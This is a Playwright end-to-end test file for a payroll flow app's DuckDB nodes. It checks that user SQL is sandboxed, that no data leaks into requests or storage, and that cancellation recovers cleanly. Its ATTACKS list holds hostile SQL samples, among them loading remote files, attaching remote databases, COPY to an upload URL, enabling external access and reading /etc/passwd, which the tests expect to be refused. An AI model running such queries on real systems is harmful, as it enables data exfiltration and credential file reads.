/**
 * QA E2E for the DuckDB nodes in Chromium against the production build (spec §13.1, AC-B3-06,
 * AC-B3-25; data-privacy.md): code.sql cannot reach the network or read files, no request or
 * storage entry carries cell values through a DuckDB flow, no CSP violation, and Hủy during a
 * running DuckDB node terminates the worker and the app recovers. Fake data only.
 */
import { expect, SUPABASE_ORIGIN, test, type Page } from './fixtures';
import {
  employees,
  fixtures,
  openFlow,
  payroll,
  payrollInput,
  pickMonth,
  recordRequests,
  RESULT_URL,
  runButton,
  textCellValues,
  timesheet,
  timesheetInput,
  uploadFixtures,
} from './helpers';
import { baseFlowDefinition } from './supabase-mock';

function withSql(sql: string, label = 'SQL thử'): Record<string, unknown> {
  const def = baseFlowDefinition();
  (def.nodes as unknown[]).push(
    { id: 'sql', type: 'code.sql', label, config: { inputs: [{ port: 'luong' }], sql } },
    { id: 'xem', type: 'output.preview', config: { title: 'Xem SQL' } },
  );
  (def.edges as unknown[]).push(
    { from: 'in_luong', to: 'sql', toPort: 'luong' },
    { from: 'sql', to: 'xem' },
  );
  return def;
}

/** Console + page errors of the page and its workers. */
function collectLogs(page: Page): string[] {
  const logs: string[] = [];
  page.on('console', (m) => logs.push(`${m.type()}: ${m.text()}`));
  page.on('pageerror', (e) => logs.push(`pageerror: ${e.message}`));
  page.on('worker', (w) => w.on('console', (m) => logs.push(`worker ${m.type()}: ${m.text()}`)));
  return logs;
}

const offOrigin = (requests: { url: string }[], origin: string) =>
  requests
    .map((r) => r.url)
    .filter((u) => {
      const x = new URL(u);
      return (
        !/^(blob|data):/.test(x.protocol) && x.origin !== origin && x.origin !== SUPABASE_ORIGIN
      );
    });

const ATTACKS = [
  "SELECT * FROM read_csv('https://example.com/a.csv')",
  "SELECT * FROM read_parquet('https://example.com/a.parquet')",
  "SELECT * FROM 'https://example.com/a.csv'",
  "SELECT * FROM/**/'https://example.com/a.csv'",
  "SELECT * FROM luong, 'https://example.com/a.csv'",
  'INSTALL httpfs',
  'LOAD httpfs',
  "ATTACH 'https://example.com/db.duckdb'",
  "COPY (SELECT 1) TO 'https://example.com/upload'",
  'SET enable_external_access = true',
  "SELECT * FROM read_text('/etc/passwd')",
];

test.describe('AC-B3-06 in the browser: code.sql cannot reach the network', () => {
  for (const sql of ATTACKS) {
    test(`refused, no request leaves the app: ${sql}`, async ({ page, supabase }) => {
      supabase.setVersions([{ no: 1, from: '2026-01-01', definition: withSql(sql) }]);
      const requests = recordRequests(page);
      const logs = collectLogs(page);
      await uploadFixtures(page);
      await runButton(page).click();
      await expect(page.getByRole('alert')).toContainText('không được phép', { timeout: 120_000 });
      expect(page.url()).not.toContain('/result');
      expect(offOrigin(requests, new URL(page.url()).origin)).toEqual([]);
      expect(requests.filter((r) => /example\.com/.test(r.url))).toEqual([]);
      expect(logs.filter((l) => /example\.com|NV0000|Content Security Policy/i.test(l))).toEqual(
        [],
      );
      expect(supabase.runLogs.at(-1)?.error_code).toBe('sql.error.forbidden');
    });
  }
});

const SECRETS = textCellValues([...fixtures('bang_luong_'), ...fixtures('cham_cong_')]);

test('a DuckDB flow (filter, groupBy, code.sql, preview, Excel): no request or storage entry carries cell values; no CSP violation', async ({
  page,
  supabase,
}) => {
  const def = baseFlowDefinition();
  (def.nodes as unknown[]).push(
    {
      id: 'loc',
      type: 'transform.filter',
      label: 'Lọc CN01',
      config: { conditions: [{ column: 'chi_nhanh', op: 'eq', value: 'cn01' }] },
    },
    {
      id: 'nhom',
      type: 'transform.groupBy',
      label: 'Nhóm',
      config: {
        by: ['chi_nhanh'],
        aggregations: [
          { key: 'tong', fn: 'sum', column: 'cong' },
          { key: 'tb', fn: 'avg', column: 'cong' },
        ],
      },
    },
    { id: 'xem1', type: 'output.preview', config: { title: 'Theo chi nhánh' } },
    {
      id: 'sql',
      type: 'code.sql',
      label: 'SQL',
      config: {
        inputs: [{ port: 'luong' }],
        sql: 'SELECT ma_nv, ho_ten, cong FROM luong WHERE ho_ten IS NOT NULL ORDER BY ma_nv',
      },
    },
    { id: 'xem2', type: 'output.preview', config: { title: 'Danh sách' } },
  );
  (def.edges as unknown[]).push(
    { from: 'in_luong', to: 'loc' },
    { from: 'loc', to: 'nhom' },
    { from: 'nhom', to: 'xem1' },
    { from: 'in_luong', to: 'sql', toPort: 'luong' },
    { from: 'sql', to: 'xem2' },
  );
  supabase.setVersions([{ no: 1, from: '2026-01-01', definition: def }]);
  const requests = recordRequests(page);
  const logs = collectLogs(page);

  await uploadFixtures(page);
  await runButton(page).click();
  await expect(page).toHaveURL(new RegExp(`${RESULT_URL}$`), { timeout: 120_000 });
  await page.getByRole('tab', { name: /^Danh sách/ }).click();
  await expect(page.getByRole('region', { name: 'Danh sách' }).getByRole('row')).not.toHaveCount(0);
  await page.getByRole('tab', { name: /^Theo chi nhánh/ }).click();
  expect(SECRETS.length).toBeGreaterThan(100);

  const origin = new URL(page.url()).origin;
  expect(offOrigin(requests, origin)).toEqual([]);
  // nothing but GET for same-origin (app shell, assets, wasm parts), and no body anywhere
  expect(requests.filter((r) => r.url.startsWith(origin) && r.method !== 'GET')).toEqual([]);
  for (const r of requests) {
    const hay = [decodeURIComponent(r.url), r.body];
    for (const s of SECRETS) {
      expect(
        hay.some((h) => h.includes(s) || h.includes(Buffer.from(s, 'utf8').toString('latin1'))),
        `${r.method} ${r.url} contains "${s}"`,
      ).toBe(false);
    }
  }
  // DuckDB parts came from the app origin only
  const parts = requests.filter((r) => /\.wasm\.part\d+$/.test(r.url));
  expect(parts.length).toBeGreaterThan(0);
  for (const p of parts) expect(p.url.startsWith(origin)).toBe(true);

  const storage = await page.evaluate(async () => {
    const dump = (s: Storage) =>
      Object.fromEntries(
        Array.from({ length: s.length }, (_, i) => s.key(i)!).map((k) => [k, s.getItem(k)]),
      );
    const cacheNames = await caches.keys();
    const cacheEntries: string[] = [];
    for (const n of cacheNames)
      for (const r of await (await caches.open(n)).keys())
        cacheEntries.push(new URL(r.url).pathname);
    return JSON.stringify({
      local: dump(localStorage),
      session: Object.keys(dump(sessionStorage)),
      idb: (await indexedDB.databases()).map((d) => d.name),
      cacheNames,
      cacheEntries,
      cookie: document.cookie,
    });
  });
  for (const s of SECRETS) expect(storage.includes(s), `storage contains "${s}"`).toBe(false);
  const parsed = JSON.parse(storage) as {
    local: object;
    session: string[];
    idb: string[];
    cacheEntries: string[];
    cookie: string;
  };
  expect(parsed.local).toEqual({});
  expect(parsed.session).toEqual(['hrflow.auth']);
  expect(parsed.idb).toEqual([]);
  expect(parsed.cookie).toBe('');
  expect(parsed.cacheEntries.every((p) => /\/duckdb\/.+\.wasm\.part\d+$/.test(p))).toBe(true);

  expect(logs.filter((l) => /Content Security Policy|violat/i.test(l))).toEqual([]);
  for (const s of SECRETS) {
    expect(
      logs.some((l) => l.includes(s)),
      `console contains "${s}"`,
    ).toBe(false);
  }
  const log = supabase.runLogs.at(-1)!;
  expect(log.status).toBe('succeeded');
  for (const s of SECRETS)
    expect(JSON.stringify(log).includes(s), `run log contains "${s}"`).toBe(false);
});

test('AC-B3-25: Hủy while a DuckDB node is running terminates the worker; the UI recovers and a light run succeeds', async ({
  page,
  supabase,
}) => {
  test.setTimeout(240_000);
  // Heavy only for the default period (2026-09); any other period makes the filter false at once.
  const def = withSql(
    "SELECT count(*) AS n FROM range(2000000000) t(i) WHERE $ky_luong = '2026-09' AND hash(i) % 7 = 3",
    'SQL nặng',
  );
  supabase.setVersions([{ no: 1, from: '2026-01-01', definition: def }]);
  const errors: string[] = [];
  page.on('pageerror', (e) => errors.push(e.message));

  await openFlow(page, '2026-09');
  await payrollInput(page).setInputFiles([payroll('bang_luong_nho.xlsx', employees(40))]);
  await timesheetInput(page).setInputFiles([
    timesheet('cham_cong_nho.xlsx', employees(40, 1, 'CN01', 24)),
  ]);
  await expect(runButton(page)).toHaveText('Chạy', { timeout: 30_000 });
  await runButton(page).click();

  const row = page
    .getByRole('region', { name: 'Đang chạy flow' })
    .getByRole('listitem')
    .filter({ has: page.getByText('SQL nặng', { exact: true }) });
  await expect(row).toContainText('Đang chạy', { timeout: 120_000 });
  await page.waitForTimeout(1500); // inside the synchronous DuckDB query now
  const t0 = Date.now();
  await page.getByRole('button', { name: 'Hủy' }).click();
  await expect(page.getByText('Đã hủy lần chạy:')).toBeVisible({ timeout: 60_000 });
  const toCancelled = Date.now() - t0;
  test.info().annotations.push({ type: 'cancel-ms', description: String(toCancelled) });
  expect(toCancelled).toBeLessThan(15_000);
  expect(page.url()).not.toContain('/result');

  // The worker was replaced: files are restored, Run is usable again.
  await expect(page.getByText('đang nạp lại file sau khi hủy…')).toHaveCount(0, {
    timeout: 60_000,
  });
  await expect(runButton(page)).toHaveText('Chạy', { timeout: 60_000 });
  await expect(runButton(page)).toBeEnabled();
  await expect(page.getByRole('button', { name: 'Bỏ file bang_luong_nho.xlsx' })).toBeEnabled();
  expect(supabase.runLogs.at(-1)?.status).toBe('cancelled');

  // A light run (other period) goes through a fresh DuckDB in the new worker.
  await pickMonth(page, '2026-08');
  await runButton(page).click();
  await expect(page).toHaveURL(new RegExp(`${RESULT_URL}$`), { timeout: 120_000 });
  expect(errors).toEqual([]);
  expect(supabase.runLogs.at(-1)?.status).toBe('succeeded');
});
